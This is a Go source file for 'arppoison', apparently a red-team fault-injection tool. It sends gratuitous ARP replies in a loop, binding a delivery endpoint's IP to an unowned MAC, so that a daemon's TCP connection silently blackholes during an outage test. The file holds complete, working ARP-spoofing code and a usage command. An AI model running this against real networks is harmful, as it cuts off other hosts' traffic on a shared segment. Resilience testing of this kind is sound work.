// arppoison — the L2 delivery-kill tool for rt-11-5 (docs/redteam-plan.md):
// a sibling container on the same bridge as the daemon repeatedly sends an
// unsolicited ARP reply (gratuitous ARP) claiming the delivery endpoint's
// IP resolves to a poison MAC nobody owns. The daemon's neighbor entry for
// the endpoint flips to the poison MAC and its established TCP to the sink
// blackholes: no RST, no FIN — the kernel just retransmits, which is the
// silent-outage shape the row measures (the server-side Write has no
// deadline, so the stall walks straight up the poll path).
//
// Usage:
//
//	arppoison -iface eth0 -ip 172.17.0.1 -mac 02:00:00:00:00:ff -interval 200ms
//
// Prints ARPPOISON_READY, sends one gratuitous reply per interval until
// SIGTERM (or -count N), prints ARPPOISON_DONE sent=N.
//
// Needs CAP_NET_RAW for the AF_PACKET socket (the privileged co-tenant
// premise — the killer container runs --cap-add NET_RAW; sending does not
// need NET_ADMIN, only claiming an IP in a reply we never answer for).
package main

import (
	"context"
	"encoding/binary"
	"flag"
	"fmt"
	"net"
	"net/netip"
	"os"
	"os/signal"
	"syscall"
	"time"

	"golang.org/x/sys/unix"
)

func main() {
	iface := flag.String("iface", "", "interface to send on (the bridge-facing eth)")
	ip := flag.String("ip", "", "IPv4 to claim (the delivery endpoint, e.g. the docker0 gateway)")
	mac := flag.String("mac", "02:00:00:00:00:ff", "the poison MAC to claim (nobody owns it — a blackhole, not a MITM)")
	interval := flag.Duration("interval", 200*time.Millisecond, "send interval")
	count := flag.Int("count", 0, "stop after N packets (0 = until SIGTERM)")
	flag.Parse()

	if *iface == "" || *ip == "" {
		fmt.Fprintln(os.Stderr, "arppoison: -iface and -ip are required")
		os.Exit(2)
	}
	poison, err := net.ParseMAC(*mac)
	if err != nil || len(poison) != 6 {
		fmt.Fprintf(os.Stderr, "arppoison: bad -mac %q\n", *mac)
		os.Exit(2)
	}
	addr, err := netip.ParseAddr(*ip)
	if err != nil || !addr.Is4() {
		fmt.Fprintf(os.Stderr, "arppoison: bad -ip %q (want IPv4)\n", *ip)
		os.Exit(2)
	}

	// os.Exit lives in main, not run, so the deferred cleanup in run() is
	// not skipped (gocritic exitAfterDefer).
	os.Exit(run(*iface, addr, poison, *interval, *count))
}

func run(iface string, ip netip.Addr, poison []byte, interval time.Duration, count int) int {
	link, err := net.InterfaceByName(iface)
	if err != nil {
		fmt.Fprintf(os.Stderr, "arppoison: iface %q: %v\n", iface, err)
		return 2
	}

	fd, err := unix.Socket(unix.AF_PACKET, unix.SOCK_RAW, int(htons(unix.ETH_P_ARP)))
	if err != nil {
		fmt.Fprintf(os.Stderr, "arppoison: AF_PACKET socket: %v (needs CAP_NET_RAW)\n", err)
		return 2
	}
	defer unix.Close(fd) //nolint:errcheck // teardown: a close error changes nothing

	frame := buildGratuitousReply(link.HardwareAddr, poison, ip)
	sa := &unix.SockaddrLinklayer{
		Protocol: htons(unix.ETH_P_ARP),
		Ifindex:  link.Index,
	}

	ctx, stop := signal.NotifyContext(context.Background(), syscall.SIGTERM, syscall.SIGINT)
	defer stop()

	fmt.Printf("ARPPOISON_READY iface=%s ip=%s mac=%s interval=%s\n", iface, ip, net.HardwareAddr(poison), interval)

	sent := 0
	for ctx.Err() == nil {
		if count > 0 && sent >= count {
			break
		}
		if err := unix.Sendto(fd, frame, 0, sa); err != nil {
			fmt.Fprintf(os.Stderr, "ARPPOISON_ERR send: %v\n", err)
			return 1
		}
		sent++
		if count > 0 && sent >= count {
			break
		}
		select {
		case <-ctx.Done():
		case <-time.After(interval):
		}
	}
	fmt.Printf("ARPPOISON_DONE sent=%d\n", sent)
	return 0
}

// htons flips a native uint16 to network order. htons isn't in x/sys/unix
// (it is endian-dependent, so packages define their own).
func htons(v uint16) uint16 {
	var b [2]byte
	binary.NativeEndian.PutUint16(b[:], v)
	return binary.BigEndian.Uint16(b[:])
}

// buildGratuitousReply builds the 42-byte Ethernet II + ARP reply frame:
// the sender claims <ip> at <poison>. A gratuitous reply (spa == tpa) may
// legally carry either broadcast or unicast targets; broadcast is the
// shape every stack's neighbor cache processes.
//
// Ethernet: dst ff:ff:ff:ff:ff:ff, src = the poison MAC (frames attributed
// to the claim), ethertype 0x0806.
// ARP: reply, sha=poison, spa=ip, tha=ff:ff:ff:ff:ff:ff, tpa=ip.
func buildGratuitousReply(srcHW, poison []byte, ip netip.Addr) []byte {
	frame := make([]byte, 14+28)
	// Ethernet header
	copy(frame[0:6], []byte{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}) // dst: broadcast
	copy(frame[6:12], poison)                                    // src: the claim
	frame[12] = 0x08                                             // ethertype: 0x0806 ARP
	frame[13] = 0x06
	// ARP payload
	a := frame[14:]
	a[0], a[1] = 0x00, 0x01 // htype: Ethernet
	a[2], a[3] = 0x08, 0x00 // ptype: IPv4
	a[4], a[5] = 6, 4       // hlen, plen
	a[6], a[7] = 0x00, 0x02 // op: REPLY
	copy(a[8:14], poison)   // sha: the poison MAC
	a4 := ip.As4()
	copy(a[14:18], a4[:])                                      // spa: the claimed IP
	copy(a[18:24], []byte{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}) // tha: broadcast
	copy(a[24:28], a4[:])                                      // tpa: == spa (gratuitous)
	_ = srcHW                                                  // the sender's real MAC is not on the wire (only the claim is)
	return frame
}
